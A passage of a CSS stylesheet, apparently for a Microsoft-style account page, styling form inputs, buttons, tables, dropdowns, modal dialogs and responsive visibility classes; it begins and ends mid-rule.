        fieldset[disabled] input[type="checkbox"]::-ms-check {
            border-color: rgba(0, 0, 0, 0.2) !important;
            background-color: transparent !important;
            color: rgba(0, 0, 0, 0.2) !important
        }

        progress {
            height: 4px;
            border-style: none;
            color: #0067b8;
            background-color: #ccc;
            -webkit-appearance: none;
            display: block
        }

        progress::-ms-fill {
            color: #0067b8
        }

        progress::-webkit-progress-value {
            background-color: #0067b8
        }

        progress::-webkit-progress-bar {
            background-color: #ccc
        }

        progress::-moz-progress-bar {
            background-color: #0067b8
        }

        input[type="range"] {
            height: 42px;
            padding-bottom: 16px;
            padding-top: 16px;
            border-style: none
        }

        input[type="range"]::-ms-track {
            height: 2px;
            border-style: none;
            background-color: transparent;
            color: transparent
        }

        input[type="range"]::-ms-fill-lower {
            background-color: #0067b8
        }

        input[type="range"]::-ms-fill-upper {
            background-color: rgba(0, 0, 0, 0.4)
        }

        input[type="range"]::-ms-thumb {
            background-color: #0067b8;
            width: 24px;
            height: 8px;
            border-radius: 4px;
            border-style: none
        }

        input[type="range"]:hover::-ms-thumb {
            background-color: #1f1f1f
        }

        input[type="range"]:active::-ms-thumb {
            background-color: #ccc
        }

        input[type="range"]:disabled::-ms-fill-lower,
        input[type="range"]:disabled::-ms-fill-upper {
            background-color: rgba(0, 0, 0, 0.2) !important
        }

        input[type="range"]:disabled::-ms-thumb {
            background-color: #ccc !important
        }

        legend {
            margin-bottom: 12px
        }

        .form-group {
            margin-bottom: 12px
        }

        .form-group label {
            margin-top: 0;
            margin-bottom: 8px
        }

        .radio,
        .checkbox {
            margin-top: 12px;
            margin-bottom: 12px
        }

        .radio label,
        .checkbox label {
            padding-left: 28px
        }

        .radio input[type="radio"],
        .radio-inline input[type="radio"],
        .checkbox input[type="checkbox"],
        .checkbox-inline input[type="checkbox"] {
            position: absolute;
            margin-left: -28px
        }

        input[type="radio"][disabled],
        input[type="radio"].disabled,
        fieldset[disabled] input[type="radio"],
        input[type="checkbox"][disabled],
        input[type="checkbox"].disabled,
        fieldset[disabled] input[type="checkbox"] {
            cursor: not-allowed
        }

        input[type="radio"][disabled]+span,
        input[type="radio"].disabled+span,
        fieldset[disabled] input[type="radio"]+span,
        input[type="checkbox"][disabled]+span,
        input[type="checkbox"].disabled+span,
        fieldset[disabled] input[type="checkbox"]+span {
            color: rgba(0, 0, 0, 0.2)
        }

        select {
            border: 2px solid rgba(0, 0, 0, 0.4);
            background-clip: padding-box;
            color: #000
        }

        select:focus option {
            background-color: #fff
        }

        select:hover {
            border-color: rgba(0, 0, 0, 0.6)
        }

        select:active {
            background-color: #fff
        }

        select[multiple]:focus {
            background-color: #fff
        }

        select[disabled],
        select.disabled,
        fieldset[disabled] select {
            cursor: not-allowed;
            background-color: rgba(0, 0, 0, 0.2) !important;
            border-color: rgba(0, 0, 0, 0.2) !important;
            color: rgba(0, 0, 0, 0.6) !important
        }

        select[disabled] option:hover,
        select[disabled] option:focus,
        select[disabled] option:active,
        select.disabled option:hover,
        select.disabled option:focus,
        select.disabled option:active,
        fieldset[disabled] select option:hover,
        fieldset[disabled] select option:focus,
        fieldset[disabled] select option:active {
            background-color: transparent !important
        }

        ::-ms-expand {
            margin: 0 6px 0 20px;
            background-color: transparent;
            border: 0
        }

        .btn-block {
            display: block;
            width: 100%
        }

        .btn-block+.btn-block {
            margin-top: 5px
        }

        input[type="submit"].btn-block,
        input[type="reset"].btn-block,
        input[type="button"].btn-block {
            width: 100%
        }

        .btn,
        button,
        input[type="button"],
        input[type="submit"],
        input[type="reset"] {
            display: inline-block;
            min-width: 100px;
            padding: 4px 12px 4px 12px;
            margin-top: 4px;
            margin-bottom: 4px;
            position: relative;
            max-width: 100%;
            text-align: center;
            white-space: nowrap;
            overflow: hidden;
            vertical-align: middle;
            text-overflow: ellipsis;
            touch-action: manipulation;
            color: #000;
            border-style: solid;
            border-width: 2px;
            border-color: transparent;
            background-color: rgba(0, 0, 0, 0.2)
        }

        .btn:hover,
        .btn:focus,
        button:hover,
        button:focus,
        input[type="button"]:hover,
        input[type="button"]:focus,
        input[type="submit"]:hover,
        input[type="submit"]:focus,
        input[type="reset"]:hover,
        input[type="reset"]:focus {
            border-color: rgba(0, 0, 0, 0.4)
        }

        .btn:hover,
        button:hover,
        input[type="button"]:hover,
        input[type="submit"]:hover,
        input[type="reset"]:hover {
            cursor: pointer
        }

        .btn:active,
        button:active,
        input[type="button"]:active,
        input[type="submit"]:active,
        input[type="reset"]:active {
            background-color: rgba(0, 0, 0, 0.4);
            border-color: transparent
        }

        .btn.btn-primary,
        button.btn-primary,
        input[type="button"].btn-primary,
        input[type="submit"].btn-primary,
        input[type="reset"].btn-primary {
            background-color: #0067b8;
            border-color: #0067b8;
            color: #fff
        }

        .btn.btn-primary:hover,
        .btn.btn-primary:focus,
        button.btn-primary:hover,
        button.btn-primary:focus,
        input[type="button"].btn-primary:hover,
        input[type="button"].btn-primary:focus,
        input[type="submit"].btn-primary:hover,
        input[type="submit"].btn-primary:focus,
        input[type="reset"].btn-primary:hover,
        input[type="reset"].btn-primary:focus {
            border-color: #004e8c
        }

        .btn.btn-primary:active,
        button.btn-primary:active,
        input[type="button"].btn-primary:active,
        input[type="submit"].btn-primary:active,
        input[type="reset"].btn-primary:active {
            background-color: rgba(0, 0, 0, 0.4);
            border-color: transparent
        }

        .btn.disabled,
        .btn[disabled],
        fieldset[disabled] .btn,
        button.disabled,
        button[disabled],
        fieldset[disabled] button,
        input[type="button"].disabled,
        input[type="button"][disabled],
        fieldset[disabled] input[type="button"],
        input[type="submit"].disabled,
        input[type="submit"][disabled],
        fieldset[disabled] input[type="submit"],
        input[type="reset"].disabled,
        input[type="reset"][disabled],
        fieldset[disabled] input[type="reset"] {
            cursor: not-allowed;
            pointer-events: none;
            outline: none;
            color: rgba(0, 0, 0, 0.2) !important;
            border-color: transparent !important;
            background-color: rgba(0, 0, 0, 0.2) !important
        }

        a.btn:link,
        a.btn:visited {
            color: #000
        }

        a.btn.btn-primary:link,
        a.btn.btn-primary:visited {
            color: #fff
        }

        .person {
            border-radius: 50%;
            display: block;
            padding: 4px;
            border: 1px dotted transparent
        }

        .person .person-graphic {
            display: block;
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            border-radius: 50%
        }

        .person.person-small {
            width: 54px;
            height: 54px
        }

        .person.person-small .person-graphic {
            width: 44px;
            height: 44px
        }

        .person.person-medium {
            width: 110px;
            height: 110px
        }

        .person.person-medium .person-graphic {
            width: 100px;
            height: 100px
        }

        .person.person-large {
            width: 210px;
            height: 210px
        }

        .person.person-large .person-graphic {
            width: 200px;
            height: 200px
        }

        .person:focus {
            outline-style: none;
            border-color: #000
        }

        table {
            background-color: transparent
        }

        th {
            text-align: left
        }

        .table {
            width: 100%;
            max-width: 100%
        }

        .table>thead>tr>th,
        .table>thead>tr>td,
        .table>tbody>tr>th,
        .table>tbody>tr>td,
        .table>tfoot>tr>th,
        .table>tfoot>tr>td {
            padding: 16px;
            vertical-align: top
        }

        .table>thead>tr>th {
            vertical-align: bottom
        }

        .table>caption+thead>tr:first-child>th,
        .table>caption+thead>tr:first-child>td,
        .table>colgroup+thead>tr:first-child>th,
        .table>colgroup+thead>tr:first-child>td,
        .table>thead:first-child>tr:first-child>th,
        .table>thead:first-child>tr:first-child>td {
            border-top: 0
        }

        table col[class*="col-"] {
            position: static;
            float: none;
            display: table-column
        }

        table td[class*="col-"],
        table th[class*="col-"] {
            position: static;
            float: none;
            display: table-cell
        }

        .table-responsive {
            overflow-x: auto;
            min-height: .01%
        }

        @media screen and (max-width:539px) {
            .table-responsive {
                width: 100%;
                margin-bottom: 15px;
                overflow-y: hidden;
                -ms-overflow-style: -ms-autohiding-scrollbar
            }

            .table-responsive>.table {
                margin-bottom: 0
            }

            .table-responsive>.table>thead>tr>th,
            .table-responsive>.table>thead>tr>td,
            .table-responsive>.table>tbody>tr>th,
            .table-responsive>.table>tbody>tr>td,
            .table-responsive>.table>tfoot>tr>th,
            .table-responsive>.table>tfoot>tr>td {
                white-space: nowrap
            }
        }

        .table>thead>tr>th {
            font-size: 12px;
            line-height: 14px;
            font-weight: 400;
            font-size: .75rem;
            line-height: .875rem;
            padding-bottom: 1.1816px;
            padding-top: 1.1816px;
            padding: 0 16px 10px 16px
        }

        .table>thead>tr>th.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 16.3632px;
            max-height: 1.0227rem
        }

        .table>thead>tr>th.text-maxlines-2 {
            max-height: 30.3632px;
            max-height: 1.8977rem
        }

        .table>thead>tr>th.text-maxlines-3 {
            max-height: 44.3632px;
            max-height: 2.7727rem
        }

        .table>thead>tr>th.text-maxlines-4 {
            max-height: 58.3632px;
            max-height: 3.6477rem
        }

        .table>tbody>tr:nth-child(odd) {
            background-color: #f2f2f2
        }

        .section {
            margin-top: 30px;
            margin-bottom: 30px
        }

        @media (min-width:320px) {
            .section {
                margin-top: 42px;
                margin-bottom: 42px
            }
        }

        .section .section-header {
            padding-bottom: 10px;
            border-bottom: 1px solid #e6e6e6;
            margin-bottom: 16px
        }

        @media (min-width:320px) {
            .section .section-header {
                margin-bottom: 32px
            }
        }

        .section .section-title {
            display: block;
            margin-top: 0;
            margin-bottom: 0;
            font-size: 15px;
            line-height: 20px;
            font-weight: 600;
            font-size: .9375rem;
            line-height: 1.25rem;
            padding-bottom: .227px;
            padding-top: .227px;
            color: #000
        }

        .section .section-title.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 20.454px;
            max-height: 1.27838rem
        }

        .section .section-title.text-maxlines-2 {
            max-height: 40.454px;
            max-height: 2.52838rem
        }

        .section .section-title.text-maxlines-3 {
            max-height: 60.454px;
            max-height: 3.77838rem
        }

        .section .section-title.text-maxlines-4 {
            max-height: 80.454px;
            max-height: 5.02838rem
        }

        @media (min-width:320px) {
            .section .section-title {
                font-size: 24px;
                line-height: 28px;
                font-weight: 300;
                font-size: 1.5rem;
                line-height: 1.75rem;
                padding-bottom: 2.3632px;
                padding-top: 2.3632px
            }

            .section .section-title.text-maxlines-1 {
                white-space: nowrap;
                text-overflow: ellipsis;
                max-height: 32.7264px;
                max-height: 2.0454rem
            }

            .section .section-title.text-maxlines-2 {
                max-height: 60.7264px;
                max-height: 3.7954rem
            }

            .section .section-title.text-maxlines-3 {
                max-height: 88.7264px;
                max-height: 5.5454rem
            }

            .section .section-title.text-maxlines-4 {
                max-height: 116.7264px;
                max-height: 7.2954rem
            }
        }

        .section .section-subtitle {
            display: block;
            font-size: 15px;
            line-height: 20px;
            font-weight: 400;
            font-size: .9375rem;
            line-height: 1.25rem;
            padding-bottom: .227px;
            padding-top: .227px;
            color: #767676
        }

        .section .section-subtitle.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 20.454px;
            max-height: 1.27838rem
        }

        .section .section-subtitle.text-maxlines-2 {
            max-height: 40.454px;
            max-height: 2.52838rem
        }

        .section .section-subtitle.text-maxlines-3 {
            max-height: 60.454px;
            max-height: 3.77838rem
        }

        .section .section-subtitle.text-maxlines-4 {
            max-height: 80.454px;
            max-height: 5.02838rem
        }

        .section .header-action {
            display: table-cell;
            vertical-align: bottom;
            white-space: nowrap;
            font-size: 12px;
            line-height: 14px;
            font-weight: 400;
            font-size: .75rem;
            line-height: .875rem;
            padding-bottom: 1.1816px;
            padding-top: 1.1816px
        }

        .section .header-action.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 16.3632px;
            max-height: 1.0227rem
        }

        .section .header-action.text-maxlines-2 {
            max-height: 30.3632px;
            max-height: 1.8977rem
        }

        .section .header-action.text-maxlines-3 {
            max-height: 44.3632px;
            max-height: 2.7727rem
        }

        .section .header-action.text-maxlines-4 {
            max-height: 58.3632px;
            max-height: 3.6477rem
        }

        .section p {
            margin-top: 12px;
            margin-bottom: 12px
        }

        .section p .more-container {
            display: block;
            margin-top: 6px
        }

        .section .btn-group {
            margin-top: 20px;
            margin-bottom: 20px
        }

        .section.remove-header-rule>.section-header {
            border-style: none
        }

        .section.has-header-action .header-titles {
            display: table-cell
        }

        .section.has-header-action .titles-outer {
            display: table;
            table-layout: fixed;
            width: 100%
        }

        .section.has-header-action .titles-inner {
            display: table-cell;
            padding-right: 10px
        }

        .section.item-section {
            margin-bottom: 32px
        }

        .section.item-section .section-header {
            margin-bottom: 16px;
            border-style: none;
            padding-bottom: 0
        }

        .section.item-section .section-title {
            color: #000;
            font-size: 15px;
            line-height: 20px;
            font-weight: 600;
            font-size: .9375rem;
            line-height: 1.25rem;
            padding-bottom: .227px;
            padding-top: .227px
        }

        .section.item-section .section-title.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 20.454px;
            max-height: 1.27838rem
        }

        .section.item-section .section-title.text-maxlines-2 {
            max-height: 40.454px;
            max-height: 2.52838rem
        }

        .section.item-section .section-title.text-maxlines-3 {
            max-height: 60.454px;
            max-height: 3.77838rem
        }

        .section.item-section .section-title.text-maxlines-4 {
            max-height: 80.454px;
            max-height: 5.02838rem
        }

        .caret {
            display: inline-block;
            width: 0;
            height: 0;
            margin-left: 2px;
            vertical-align: middle;
            border-top: 4px solid;
            border-right: 4px solid transparent;
            border-left: 4px solid transparent
        }

        .dropdown {
            position: relative
        }

        .dropdown-toggle:focus {
            outline: 0
        }

        .dropdown-menu {
            position: absolute;
            top: 100%;
            left: 0;
            z-index: 1000;
            display: none;
            float: left;
            min-width: 160px;
            padding: 5px 0;
            margin: 2px 0 0;
            list-style: none;
            font-size: 14px;
            text-align: left;
            background-color: #fff;
            border: 1px solid #ccc;
            border: 1px solid rgba(0, 0, 0, 0.15);
            border-radius: 4px;
            -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
            background-clip: padding-box
        }

        .dropdown-menu.pull-right {
            right: 0;
            left: auto
        }

        .dropdown-menu .divider {
            height: 1px;
            margin: 9px 0;
            overflow: hidden;
            background-color: #e5e5e5
        }

        .dropdown-menu>li>a {
            display: block;
            padding: 3px 20px;
            clear: both;
            font-weight: normal;
            line-height: 1.42857;
            color: #333;
            white-space: nowrap
        }

        .dropdown-menu>li>a:hover,
        .dropdown-menu>li>a:focus {
            text-decoration: none;
            color: #262626;
            background-color: #f5f5f5
        }

        .dropdown-menu>.active>a,
        .dropdown-menu>.active>a:hover,
        .dropdown-menu>.active>a:focus {
            color: #fff;
            text-decoration: none;
            outline: 0;
            background-color: #428bca
        }

        .dropdown-menu>.disabled>a,
        .dropdown-menu>.disabled>a:hover,
        .dropdown-menu>.disabled>a:focus {
            color: #777
        }

        .dropdown-menu>.disabled>a:hover,
        .dropdown-menu>.disabled>a:focus {
            text-decoration: none;
            background-color: transparent;
            background-image: none;
            filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
            cursor: not-allowed
        }

        .open>.dropdown-menu {
            display: block
        }

        .open>a {
            outline: 0
        }

        .dropdown-menu-right {
            left: auto;
            right: 0
        }

        .dropdown-menu-left {
            left: 0;
            right: auto
        }

        .dropdown-header {
            display: block;
            padding: 3px 20px;
            font-size: 12px;
            line-height: 1.42857;
            color: #777;
            white-space: nowrap
        }

        .dropdown-backdrop {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            top: 0;
            z-index: 990
        }

        .pull-right>.dropdown-menu {
            right: 0;
            left: auto
        }

        .dropup .caret,
        .navbar-fixed-bottom .dropdown .caret {
            border-top: 0;
            border-bottom: 4px solid;
            content: ""
        }

        .dropup .dropdown-menu,
        .navbar-fixed-bottom .dropdown .dropdown-menu {
            top: auto;
            bottom: 100%;
            margin-bottom: 1px
        }

        @media (min-width:768px) {
            .navbar-right .dropdown-menu {
                right: 0;
                left: auto
            }

            .navbar-right .dropdown-menu-left {
                left: 0;
                right: auto
            }
        }

        [data-toggle="buttons"]>.btn input[type="radio"],
        [data-toggle="buttons"]>.btn input[type="checkbox"],
        [data-toggle="buttons"]>.btn-group>.btn input[type="radio"],
        [data-toggle="buttons"]>.btn-group>.btn input[type="checkbox"] {
            position: absolute;
            clip: rect(0, 0, 0, 0);
            pointer-events: none
        }

        .btn-group:before,
        .btn-group:after {
            content: " ";
            display: table
        }

        .btn-group:after {
            clear: both
        }

        .btn-group .btn {
            float: left;
            margin-right: 4px
        }

        .input-group {
            position: relative;
            display: table;
            border-collapse: separate
        }

        .input-group[class*="col-"] {
            float: none;
            padding-left: 0;
            padding-right: 0
        }

        .input-group .form-control {
            position: relative;
            z-index: 2;
            float: left;
            width: 100%;
            margin-bottom: 0
        }

        .input-group-addon,
        .input-group-btn,
        .input-group .form-control {
            display: table-cell
        }

        .input-group-addon:not(:first-child):not(:last-child),
        .input-group-btn:not(:first-child):not(:last-child),
        .input-group .form-control:not(:first-child):not(:last-child) {
            border-radius: 0
        }

        .input-group-addon,
        .input-group-btn {
            width: 1%;
            white-space: nowrap;
            vertical-align: middle
        }

        .input-group-addon {
            padding: 6px 12px;
            font-size: 14px;
            font-weight: normal;
            line-height: 1;
            color: #555;
            text-align: center;
            background-color: #eee;
            border: 1px solid #ccc;
            border-radius: 4px
        }

        .input-group-addon.input-sm,
        .input-group-sm>.input-group-addon,
        .input-group-sm>.input-group-btn>.input-group-addon.btn {
            padding: 5px 10px;
            font-size: 12px;
            border-radius: 3px
        }

        .input-group-addon.input-lg,
        .input-group-lg>.input-group-addon,
        .input-group-lg>.input-group-btn>.input-group-addon.btn {
            padding: 10px 16px;
            font-size: 18px;
            border-radius: 6px
        }

        .input-group-addon input[type="radio"],
        .input-group-addon input[type="checkbox"] {
            margin-top: 0
        }

        .input-group .form-control:first-child,
        .input-group-addon:first-child,
        .input-group-btn:first-child>.btn,
        .input-group-btn:first-child>.btn-group>.btn,
        .input-group-btn:first-child>.dropdown-toggle,
        .input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle),
        .input-group-btn:last-child>.btn-group:not(:last-child)>.btn {
            border-bottom-right-radius: 0;
            border-top-right-radius: 0
        }

        .input-group-addon:first-child {
            border-right: 0
        }

        .input-group .form-control:last-child,
        .input-group-addon:last-child,
        .input-group-btn:last-child>.btn,
        .input-group-btn:last-child>.btn-group>.btn,
        .input-group-btn:last-child>.dropdown-toggle,
        .input-group-btn:first-child>.btn:not(:first-child),
        .input-group-btn:first-child>.btn-group:not(:first-child)>.btn {
            border-bottom-left-radius: 0;
            border-top-left-radius: 0
        }

        .input-group-addon:last-child {
            border-left: 0
        }

        .input-group-btn {
            position: relative;
            font-size: 0;
            white-space: nowrap
        }

        .input-group-btn>.btn {
            position: relative
        }

        .input-group-btn>.btn+.btn {
            margin-left: -1px
        }

        .input-group-btn>.btn:hover,
        .input-group-btn>.btn:focus,
        .input-group-btn>.btn:active {
            z-index: 2
        }

        .input-group-btn:first-child>.btn,
        .input-group-btn:first-child>.btn-group {
            margin-right: -1px
        }

        .input-group-btn:last-child>.btn,
        .input-group-btn:last-child>.btn-group {
            margin-left: -1px
        }

        .alert {
            margin-bottom: 8px;
            margin-top: 8px
        }

        .alert-error {
            color: #e81123
        }

        .modal-open {
            overflow: hidden
        }

        .modal {
            display: none;
            overflow: hidden;
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 1040;
            -webkit-overflow-scrolling: touch;
            outline: 0
        }

        .modal-open .modal {
            overflow-x: hidden;
            overflow-y: auto
        }

        .modal-dialog {
            position: relative;
            width: auto
        }

        .modal-content {
            position: relative;
            background-color: #fff;
            background-clip: padding-box;
            outline: 0
        }

        .modal-backdrop {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            background-color: #000
        }

        .modal-backdrop.fade {
            opacity: 0;
            filter: alpha(opacity=0)
        }

        .modal-backdrop.in {
            opacity: .5;
            filter: alpha(opacity=50)
        }

        .modal-header {
            min-height: 16.42857px
        }

        .modal-title {
            margin: 0;
            line-height: 1.42857
        }

        .modal-body {
            position: relative
        }

        .modal-footer:before,
        .modal-footer:after {
            content: " ";
            display: table
        }

        .modal-footer:after {
            clear: both
        }

        .modal-scrollbar-measure {
            position: absolute;
            top: -9999px;
            width: 50px;
            height: 50px;
            overflow: scroll
        }

        @media (min-width:540px) {
            .modal-dialog {
                width: 600px
            }

            .modal-sm {
                width: 300px
            }
        }

        @media (min-width:768px) {
            .modal-lg {
                width: 900px
            }
        }

        .modal .modal-dialog {
            margin: 50vh auto;
            -webkit-transform: translate(0, -50%);
            -ms-transform: translate(0, -50%);
            -o-transform: translate(0, -50%);
            transform: translate(0, -50%);
            border: 2px solid #0067b8
        }

        .modal .modal-content {
            padding: 16px
        }

        .modal p:first-child {
            margin-top: 0
        }

        .modal .btn {
            width: calc(48%)
        }

        .modal .btn:last-child {
            margin-right: 0
        }

        .modal .btn:only-child {
            float: right
        }

        .modal .modal-footer {
            margin-top: 24px
        }

        .tooltip {
            position: absolute;
            z-index: 1070;
            display: block;
            visibility: visible
        }

        .tooltip-inner {
            text-decoration: none
        }

        .tooltip .tooltip-inner {
            background: #f2f2f2;
            color: #000;
            border: 1px solid #ccc;
            padding: 5px 8px 7px 8px;
            max-width: 320px
        }

        .clearfix:before,
        .clearfix:after {
            content: " ";
            display: table
        }

        .clearfix:after {
            clear: both
        }

        .center-block {
            display: block;
            margin-left: auto;
            margin-right: auto
        }

        .hide {
            display: none !important
        }

        .show {
            display: block !important
        }

        .invisible {
            visibility: hidden
        }

        .text-hide {
            font: 0/0 a;
            color: transparent;
            text-shadow: none;
            background-color: transparent;
            border: 0
        }

        .hidden {
            display: none !important;
            visibility: hidden !important
        }

        .affix {
            position: fixed
        }

        .pull-right {
            float: right !important
        }

        .pull-left {
            float: left !important
        }

        @-ms-viewport {
            width: device-width
        }

        @media (max-width:539px) {
            .visible-xs {
                display: block !important
            }

            table.visible-xs {
                display: table
            }

            tr.visible-xs {
                display: table-row !important
            }

            th.visible-xs,
            td.visible-xs {
                display: table-cell !important
            }
        }

        @media (max-width:539px) {
            .visible-xs-block {
                display: block !important
            }
        }

        @media (max-width:539px) {
            .visible-xs-inline {
                display: inline !important
            }
        }

        @media (max-width:539px) {
            .visible-xs-inline-block {
                display: inline-block !important
            }
        }

        @media (min-width:540px) and (max-width:767px) {
            .visible-sm {
                display: block !important
            }

            table.visible-sm {
                display: table
            }

            tr.visible-sm {
                display: table-row !important
            }

            th.visible-sm,
            td.visible-sm {
                display: table-cell !important
            }
        }

        @media (min-width:540px) and (max-width:767px) {
            .visible-sm-block {
                display: block !important
            }
        }

        @media (min-width:540px) and (max-width:767px) {
            .visible-sm-inline {
                display: inline !important
            }
        }

        @media (min-width:540px) and (max-width:767px) {
            .visible-sm-inline-block {
                display: inline-block !important
            }
        }

        @media (min-width:768px) and (max-width:991px) {
            .visible-md {
                display: block !important
            }

            table.visible-md {
                display: table
            }

            tr.visible-md {
                display: table-row !important
            }

            th.visible-md,
            td.visible-md {
                display: table-cell !important
            }
        }

        @media (min-width:768px) and (max-width:991px) {
            .visible-md-block {
                display: block !important
            }
        }

        @media (min-width:768px) and (max-width:991px) {
            .visible-md-inline {
                display: inline !important
            }
        }

        @media (min-width:768px) and (max-width:991px) {
            .visible-md-inline-block {
                display: inline-block !important
            }
        }

        @media (min-width:992px) {
            .visible-lg {
                display: block !important
            }

            table.visible-lg {
                display: table
            }

            tr.visible-lg {
                display: table-row !important
            }

            th.visible-lg,
            td.visible-lg {
                display: table-cell !important
            }
        }

        @media (min-width:992px) {
            .visible-lg-block {
                display: block !important
            }
        }

        @media (min-width:992px) {
            .visible-lg-inline {
                display: inline !important
            }
        }

        @media (min-width:992px) {
            .visible-lg-inline-block {
                display: inline-block !important
            }
        }

        @media (max-width:539px) {
            .hidden-xs {
                display: none !important
            }
        }

        @media (min-width:540px) and (max-width:767px) {
            .hidden-sm {
                display: none !important
            }
        }

        @media (min-width:768px) and (max-width:991px) {
            .hidden-md {
                display: none !important
            }
        }

        @media (min-width:992px) {
            .hidden-lg {
                display: none !important
            }
        }

        .visible-print {
            display: none !important
        }

        @media print {
            .visible-print {
                display: block !important
            }

            table.visible-print {
                display: table
            }

            tr.visible-print {
                display: table-row !important
            }

            th.visible-print,
            td.visible-print {
                display: table-cell !important
            }
        }

        .visible-print-block {
            display: none !important
        }

        @media print {
            .visible-print-block {
                display: block !important
            }
        }

        .visible-print-inline {
            display: none !important
        }

        @media print {
            .visible-print-inline {
                display: inline !important
            }
        }

        .visible-print-inline-block {
            display: none !important
        }

        @media print {
            .visible-print-inline-block {
                display: inline-block !important
            }
        }

        @media print {
            .hidden-print {
                display: none !important
            }
        }

        .visible-xs,
        .visible-sm,
        .visible-md,
        .visible-lg,
        .visible-xl {
            display: none !important
        }

        .visible-xs-block,
        .visible-xs-inline,
        .visible-xs-inline-block,
        .visible-sm-block,
        .visible-sm-inline,
        .visible-sm-inline-block,
        .visible-md-block,
        .visible-md-inline,
        .visible-md-inline-block,
        .visible-lg-block,
        .visible-lg-inline,
        .visible-lg-inline-block,
        .visible-xl-block,
        .visible-xl-inline,
        .visible-xl-inline-block {
            display: none !important
        }

        @media (min-width:1400px) {
            .visible-xl {
                display: block !important
            }

            table.visible-xl {
                display: table
            }

            tr.visible-xl {
                display: table-row !important
            }

            th.visible-xl,
            td.visible-xl {
                display: table-cell !important
            }
        }

        @media (min-width:1400px) {
            .visible-xl-block {
                display: block !important
            }
        }

        @media (min-width:1400px) {
            .visible-xl-inline {
                display: inline !important
            }
        }

        @media (min-width:1400px) {
            .visible-xl-inline-block {
                display: inline-block !important
            }
        }

        @media (min-width:1400px) {
            .hidden-xl {
                display: none !important
            }
        }

        @font-face {
            font-family: "Segoe UI Webfont";
            font-weight: 300;
            src: local("Segoe UI Semilight")
        }

        @font-face {
            font-family: "Segoe UI Webfont";
            font-weight: 700;
            src: local("Segoe UI Bold")
        }

        @font-face {
            font-family: "Segoe UI Webfont";
            font-style: italic;
            font-weight: 400;
            src: local("Segoe UI Italic")
        }

        @font-face {
            font-family: "Segoe UI Webfont";
            font-style: italic;
            font-weight: 700;
            src: local("Segoe UI Bold Italic")
        }

        .container,
        .container-fluid {
            width: 100%
        }

        .IE_M8 select {
            background-color: #fff !important
        }

        body.IE_M7.rtl {
            font-family: "Segoe UI", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
        }

        .IE_M7 ul {
            margin-left: 0
        }

        .IE_M7 input[type="button"],
        .IE_M7 input[type="submit"],
        .IE_M7 button,
        .IE_M7 input[type="button"].btn,
        .IE_M7 input[type="submit"].btn,
        .IE_M7 button.btn {
            line-height: 142%;
            overflow: visible
        }

        .IE_M7 div.input-group {
            float: left;
            z-index: 5000
        }

        .IE_M7 div.input-group button,
        .IE_M7 div.input-group button.btn {
            overflow: hidden
        }

        .IE_M7 div.input-group label.input-group-addon {
            width: auto;
            float: left
        }

        .IE_M7 div.input-group div.input-group-btn {
            float: left
        }

        .text-caption {
            margin: .5rem 0 .5rem 0;
            margin: 8px 0 8px 0
        }

        select {
            padding-top: 3px;
            padding-bottom: 3px;
            padding-left: 6px
        }

        .section {
            margin-top: 0
        }

        body {
            direction: ltr
        }

        body #maincontent,
        body #c_content {
            margin: 0 auto
        }

        body #maincontent {
            width: 90%;
            min-height: 400px
        }

        .ltr_override,
        .dirltr {
            direction: ltr;
            text-align: left
        }

        label.label-margin {
            margin-top: 0;
            margin-bottom: 8px
        }

        label.disabled {
            border: 0;
            background-color: rgba(0, 0, 0, 0.2) !important
        }

        label.focus-border-color.input-group-addon.has-error,
        label.input-group-addon.has-error {
            border-color: #e81123
        }

        .bold {
            font-weight: 600
        }

        .modal-header h4.UserTitle,
        .wrap-content {
            word-wrap: break-word
        }

        label.placeholder {
            display: none !important
        }

        .text-secondary {
            color: rgba(0, 0, 0, 0.7);
            font-size: 13px
        }

        .agreement-layout {
            white-space: pre-wrap;
            word-wrap: break-word;
            overflow-x: hidden
        }

        body.cb {
            text-align: center
        }

        body.cb #ftrLogo {
            margin: 0
        }

        body.cb #maincontent {
            max-width: 384px;
            padding-left: 12px;
            padding-right: 12px
        }

        body.cb .text-13 {
            font-size: .8125rem
        }

        body.cb .radio,
        body.cb .alert-error {
            text-align: left
        }

        body.cb div.placeholderContainer {
            width: 100%;
            position: relative
        }

        body.cb div.placeholderInnerContainer {
            left: 0;
            top: 0;
            width: 100%;
            position: absolute;
            z-index: 5
        }

        body.cb div.placeholder {
            color: #666;
            background-color: transparent;
            margin-top: 6px;
            margin-left: 9px;
            white-space: nowrap;
            text-align: left;
            cursor: text
        }

        body.cb div.placeholder.ltr_override {
            margin-left: 11px;
            margin-right: auto;
            text-align: left
        }

        body.cb .modalDialogOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            opacity: .5;
            -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=50)";
            filter: alpha(opacity=50);
            z-index: 50000
        }

        body.cb .modalDialogContainer {
            position: fixed;
            top: 60px;
            max-width: 356px;
            width: 83%;
            width: calc(90% - 28px);
            max-height: 80%;
            max-height: calc(100% - 80px);
            margin-left: -2px;
            margin-right: -2px;
            border: 1px solid #0067b8;
            background-color: #fff;
            z-index: 50001;
            overflow: auto;
            overflow-x: hidden
        }

        body.cb .modalDialogPadding {
